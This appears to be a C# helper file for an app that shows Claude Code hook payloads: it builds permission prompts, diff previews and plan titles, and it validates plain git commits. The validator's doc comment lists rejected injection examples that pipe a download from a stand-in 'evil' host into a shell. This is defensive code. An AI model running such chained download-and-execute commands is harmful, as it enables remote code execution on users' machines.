// HookText.cs
// Port of Sources/notchcode/Core/HookText.swift.
// Pure helpers that read hook payloads: permission titles and details, proposed
// changes, commit subjects, patch counts, tool verbs and session urgency.

using System.IO;

namespace Notchcode.Core;

public static class HookText
{
    public static int Urgency(SessionState state) => state switch
    {
        SessionState.NeedsYou => 3,
        SessionState.Working => 2,
        SessionState.Done => 1,
        _ => 0,
    };

    public static string Verb(string tool) => tool switch
    {
        "Edit" or "Write" or "MultiEdit" or "NotebookEdit" => "Editing",
        "Bash" => "Running",
        "Read" or "Grep" or "Glob" => "Reading",
        _ => "Thinking",
    };

    public static string PermissionTitle(string tool) => tool switch
    {
        "Bash" => "Run a command?",
        "Edit" or "MultiEdit" or "NotebookEdit" => "Edit a file?",
        "Write" => "Write a file?",
        "Read" => "Read a file?",
        "WebFetch" => "Fetch a page?",
        "WebSearch" => "Search the web?",
        _ => $"Use {tool}?",
    };

    public static string PermissionDetail(string tool, JsonValue? input)
    {
        if (input is null) return tool;
        string[] keys = ["command", "file_path", "notebook_path", "url", "query", "pattern", "path"];
        foreach (var key in keys)
        {
            if (input[key]?.StringValue is { Length: > 0 } value) return value;
        }
        return tool;
    }

    /// Why the request is shown: the tool's own description, else the payload's message.
    /// What "Always" would remember is `AlwaysRules`, shown on its own lines.
    public static string? PermissionReason(JsonValue payload)
    {
        if (payload["tool_input"]?["description"]?.StringValue is { Length: > 0 } text) return text;
        if (payload["message"]?.StringValue is { Length: > 0 } message) return message;
        return null;
    }

    /// What "Always" would remember, one line per `permission_suggestions` entry. The reply
    /// sends every entry back (HookReply.ReplyLine), so the card must show every one.
    public static List<string> AlwaysRules(JsonValue payload)
        => (payload["permission_suggestions"]?.ArrayValue ?? []).Select(SuggestionText).ToList();

    /// "Always allows Bash(npm test:*) for this session." An entry of a kind this app does
    /// not know still gets a line: it is sent back all the same.
    private static string SuggestionText(JsonValue suggestion)
    {
        string? destination = suggestion["destination"]?.StringValue switch
        {
            "session" => "for this session",
            "localSettings" => "in this project's local settings",
            "projectSettings" => "in this project's settings",
            "userSettings" => "in your user settings",
            _ => null,
        };
        string? text = null;
        switch (suggestion["type"]?.StringValue)
        {
            case "setMode":
                var mode = suggestion["mode"]?.StringValue ?? "";
                text = mode == "acceptEdits" ? "Always accepts edits" : $"Switches to {mode} mode";
                break;
            case "addRules":
            case "replaceRules":
                var rules = suggestion["rules"]?.ArrayValue ?? [];
                var names = new List<string>();
                foreach (var rule in rules)
                {
                    if (rule["toolName"]?.StringValue is not { } tool) continue;
                    names.Add(rule["ruleContent"]?.StringValue is { Length: > 0 } content ? $"{tool}({content})" : tool);
                }
                if (names.Count > 0)
                {
                    var verb = suggestion["behavior"]?.StringValue == "deny" ? "Always denies " : "Always allows ";
                    text = verb + string.Join(", ", names);
                }
                break;
            case "addDirectories":
                var dirs = (suggestion["directories"]?.ArrayValue ?? []).Select(d => d.StringValue).OfType<string>().ToList();
                if (dirs.Count > 0) text = "Always adds " + string.Join(", ", dirs);
                break;
        }
        var line = text ?? "Applies " + (suggestion["type"]?.StringValue ?? "a permission update");
        return (destination is null ? line : line + " " + destination) + ".";
    }

    /// The diff an Edit / Write / MultiEdit / NotebookEdit request would make, and the card title.
    public static (FileChange File, string Title)? ProposedChange(string tool, JsonValue? input, string cwd, bool readsDisk)
    {
        if (input is null) return null;
        switch (tool)
        {
            case "Edit":
            {
                if (input["file_path"]?.StringValue is not { } path
                    || input["old_string"]?.StringValue is not { } old
                    || input["new_string"]?.StringValue is not { } @new) return null;
                var file = DiffBuilder.ForEdit(cwd, path, old, @new, input["replace_all"]?.BoolValue ?? false, readsDisk);
                var title = file.Kind == "new" ? "Write a new file?" : $"Edit {Format.FileName(file.Path)}?";
                return (file, title);
            }
            case "Write":
            {
                if (input["file_path"]?.StringValue is not { } path
                    || input["content"]?.StringValue is not { } content) return null;
                var file = DiffBuilder.ForWrite(cwd, path, content, readsDisk);
                var title = file.Kind == "new" ? "Write a new file?" : $"Rewrite {Format.FileName(file.Path)}?";
                return (file, title);
            }
            case "MultiEdit":
            {
                if (input["file_path"]?.StringValue is not { } path
                    || input["edits"]?.ArrayValue is not { } list) return null;
                var edits = new List<DiffBuilder.MultiEditItem>();
                foreach (var edit in list)
                {
                    if (edit["old_string"]?.StringValue is not { } old || edit["new_string"]?.StringValue is not { } @new) continue;
                    edits.Add(new DiffBuilder.MultiEditItem(old, @new, edit["replace_all"]?.BoolValue ?? false));
                }
                if (edits.Count == 0) return null;
                var file = DiffBuilder.ForMultiEdit(cwd, path, edits, readsDisk);
                var name = Format.FileName(file.Path);
                var title = file.Kind == "new" ? "Write a new file?"
                    : edits.Count > 1 ? $"Edit {edits.Count} places in {name}?" : $"Edit {name}?";
                return (file, title);
            }
            case "NotebookEdit":
            {
                // The notebook on disk is JSON, not the cell: show the new cell source as added lines.
                if ((input["notebook_path"]?.StringValue ?? input["file_path"]?.StringValue) is not { } path
                    || input["new_source"]?.StringValue is not { } source) return null;
                var file = DiffBuilder.ForWrite(cwd, path, source, readsDisk: false) with { Kind = "edit" };
                return (file, $"Edit {Format.FileName(file.Path)}?");
            }
            default:
                return null;
        }
    }

    /// A plan's title: its first ATX heading (`#` to `######`) without the marks and a leading
    /// "Plan:" or "Plan –". Front matter and fenced code are skipped. With no heading, the
    /// first non-empty line; null only for an empty plan.
    ///
    ///     "# Plan: Add the hook\n…"      "Add the hook"
    ///     "## Steps"                     "Steps"
    ///     "Rename the flag.\n…"          "Rename the flag."
    public static string? PlanTitle(string markdown)
    {
        var lines = markdown.FileLines();
        if (PlanHeadingIndex(lines) is not int index)
            return lines.Select(l => l.Trim()).FirstOrDefault(l => l.Length > 0);
        var text = lines[index].Trim().TrimStart('#').Trim();
        foreach (var prefix in (string[])["plan:", "plan –", "plan —", "plan -"])
        {
            if (!text.ToLowerInvariant().StartsWith(prefix, StringComparison.Ordinal)) continue;
            text = text[Math.Min(prefix.Length, text.Length)..].Trim();
            break;
        }
        return text.Length == 0 ? null : text;
    }

    /// The plan's lines without the heading `PlanTitle` shows (and one blank line after it).
    /// Front matter stays; the Markdown renderer shows it as code.
    public static List<string> PlanBody(string markdown)
    {
        var lines = markdown.FileLines();
        if (PlanHeadingIndex(lines) is not int index) return lines;
        lines.RemoveAt(index);
        if (index < lines.Count && lines[index].Trim().Length == 0) lines.RemoveAt(index);
        return lines;
    }

    /// The index of the first ATX heading outside front matter and fenced code.
    private static int? PlanHeadingIndex(IReadOnlyList<string> lines)
    {
        bool inFrontMatter = lines.Count > 0 && lines[0].Trim() == "---";
        string? fence = null;
        for (int i = 0; i < lines.Count; i++)
        {
            var line = lines[i].Trim();
            if (inFrontMatter)
            {
                if (i > 0 && (line == "---" || line == "...")) inFrontMatter = false;
                continue;
            }
            if (fence is not null)
            {
                if (line.StartsWith(fence, StringComparison.Ordinal)) fence = null;
                continue;
            }
            if (line.StartsWith("```", StringComparison.Ordinal) || line.StartsWith("~~~", StringComparison.Ordinal))
            {
                fence = line[..3];
                continue;
            }
            int marks = 0;
            while (marks < line.Length && line[marks] == '#') marks++;
            if (marks < 1 || marks > 6) continue;
            if (marks == line.Length || line[marks] == ' ' || line[marks] == '\t') return i;
        }
        return null;
    }

    /// Pulls the subject line out of `git commit -m "..."` or a heredoc message.
    public static string? CommitSubject(string command)
    {
        string[] heredocMarkers = ["<<'EOF'", "<<\"EOF\"", "<<EOF", "<< 'EOF'", "<< EOF"];
        foreach (var marker in heredocMarkers)
        {
            int at = command.IndexOf(marker, StringComparison.Ordinal);
            if (at < 0) continue;
            var rest = command[(at + marker.Length)..];
            foreach (var line in rest.Split('\n', StringSplitOptions.RemoveEmptyEntries))
            {
                var text = TrimBlanks(line);
                if (text.Length > 0 && text != "EOF" && !text.StartsWith(')')) return text;
            }
        }
        int flag = command.IndexOf("-m ", StringComparison.Ordinal);
        if (flag < 0) return null;
        int i = flag + 3;
        while (i < command.Length && command[i] == ' ') i++;
        if (i >= command.Length || (command[i] != '"' && command[i] != '\'')) return null;
        char quote = command[i];
        int end = command.IndexOf(quote, i + 1);
        if (end < 0) return null;
        var message = command[(i + 1)..end];
        var first = message.Split('\n', StringSplitOptions.RemoveEmptyEntries).FirstOrDefault();
        if (first is null) return null;
        var subject = TrimBlanks(first);
        return subject.Length == 0 ? null : subject;
    }

    /// Swift's `.whitespaces`: spaces and tabs, not line breaks.
    private static string TrimBlanks(string s) => s.Trim(' ', '\t', ' ');

    /// True for a plain `git commit` and nothing more, so the commit card, whose Commit
    /// allows the whole command, can never approve a second command riding on it. The
    /// message arguments are set aside first (`-m "…"`, `-m '…'`, `--message=…`, `-am "…"`,
    /// and Claude Code's heredoc `-m "$(cat <<'EOF' … EOF\n)"`); a double-quoted message
    /// may not hold `$` or a backtick, an unquoted heredoc neither. What is left must be words
    /// of `[A-Za-z0-9_./=-]`: no `;`, `&&`, `||`, `|`, backtick, `$(`, `>`, `<` or newline.
    ///
    ///     git commit -m "Fix the peek"                           true
    ///     git commit -m "$(cat <<'EOF'\nFix\n\nBody\nEOF\n)"     true
    ///     git commit --amend --no-edit                           true
    ///     git commit -m "x" &amp;&amp; curl evil | sh            false
    ///     git commit -m "$(curl evil)"                           false
    ///     git commit -m x > /tmp/log                             false
    public static bool IsPlainCommit(string command)
    {
        var s = command.Trim();
        int i = 0;
        static bool Blank(char c) => c == ' ' || c == '\t';
        void SkipBlanks() { while (i < s.Length && Blank(s[i])) i++; }
        bool Boundary() => i >= s.Length || Blank(s[i]);
        static bool IsWordChar(char c) => c < 128 && (char.IsAsciiLetterOrDigit(c) || "_./=-".Contains(c));
        bool Take(string text)
        {
            if (i + text.Length > s.Length || string.CompareOrdinal(s, i, text, 0, text.Length) != 0) return false;
            i += text.Length;
            return true;
        }
        string Word()
        {
            int start = i;
            while (i < s.Length && IsWordChar(s[i])) i++;
            return s[start..i];
        }
        // `"$(cat <<'EOF'` already taken: the body up to the marker line, then `)"`.
        bool Heredoc()
        {
            bool dash = Take("-");
            SkipBlanks();
            char? quote = null;
            if (i < s.Length && (s[i] == '\'' || s[i] == '"')) { quote = s[i]; i++; }
            var marker = Word();
            if (marker.Length == 0) return false;
            if (quote is char q && !Take(q.ToString())) return false;
            SkipBlanks();
            if (!Take("\n")) return false;
            while (true)
            {
                if (i >= s.Length) return false;
                int end = i;
                while (end < s.Length && s[end] != '\n') end++;
                var line = s[i..end];
                i = Math.Min(end + 1, s.Length);
                if (line == marker || (dash && line.TrimStart('\t') == marker)) break;
                // An unquoted marker lets the shell expand the body.
                if (quote is null && line.IndexOfAny(['$', '`', '\\']) >= 0) return false;
            }
            while (i < s.Length && (Blank(s[i]) || s[i] == '\n')) i++;
            return Take(")\"");
        }
        // One message argument, taken only when the shell reads it as literal text.
        bool Message()
        {
            if (i >= s.Length) return false;
            if (Take("\"$(cat <<")) return Heredoc() && Boundary();
            switch (s[i])
            {
                case '\'':
                    i++;
                    while (i < s.Length && s[i] != '\'') i++;
                    if (!Take("'")) return false;
                    break;
                case '"':
                    i++;
                    while (i < s.Length && s[i] != '"')
                    {
                        if (s[i] == '$' || s[i] == '`') return false;
                        i += s[i] == '\\' ? 2 : 1;
                    }
                    if (!Take("\"")) return false;
                    break;
                default:
                    if (Word().Length == 0) return false;
                    break;
            }
            return Boundary();
        }
        static bool TakesMessage(string w)
        {
            if (w == "-m" || w == "--message" || w == "--message=") return true;
            // A short-option cluster ending in m: `-am`.
            return w.Length > 2 && w.StartsWith('-') && !w.StartsWith("--", StringComparison.Ordinal) && w.EndsWith('m')
                && w[1..].All(char.IsAsciiLetter);
        }

        if (Word() != "git" || i >= s.Length || !Blank(s[i])) return false;
        SkipBlanks();
        if (Word() != "commit" || !Boundary()) return false;
        while (true)
        {
            SkipBlanks();
            if (i >= s.Length) return true;
            var w = Word();
            if (TakesMessage(w))
            {
                SkipBlanks();
                if (!Message()) return false;
                continue;
            }
            if (w.Length == 0 || !Boundary()) return false;
        }
    }

    /// Counts added and removed lines in a Claude Code `structuredPatch`.
    public static (int Added, int Removed)? PatchCounts(JsonValue? patch)
    {
        if (patch?.ArrayValue is not { } hunks) return null;
        int added = 0, removed = 0;
        foreach (var hunk in hunks)
        {
            foreach (var line in hunk["lines"]?.ArrayValue ?? [])
            {
                if (line.StringValue is not { } text) continue;
                if (text.StartsWith('+')) added++;
                else if (text.StartsWith('-')) removed++;
            }
        }
        return (added, removed);
    }

    /// True when `path` names a file under Claude Code's plans folder (%USERPROFILE%\.claude\plans),
    /// after "." and ".." are resolved, '/' and '\' alike, case ignored. The plan card reads
    /// `planFilePath` only there.
    public static bool IsUnderPlansDirectory(string path, string? plansDirectory = null)
    {
        if (string.IsNullOrEmpty(path) || !Paths.IsAbsolute(path)) return false;
        try
        {
            var full = Path.GetFullPath(path.Replace('/', '\\'));
            var root = Path.GetFullPath((plansDirectory ?? NotchcodePaths.ClaudePlansDirectory).Replace('/', '\\')).TrimEnd('\\') + "\\";
            return full.StartsWith(root, StringComparison.OrdinalIgnoreCase) && full.Length > root.Length;
        }
        catch (Exception e) when (e is ArgumentException or NotSupportedException or PathTooLongException)
        {
            return false;
        }
    }
}
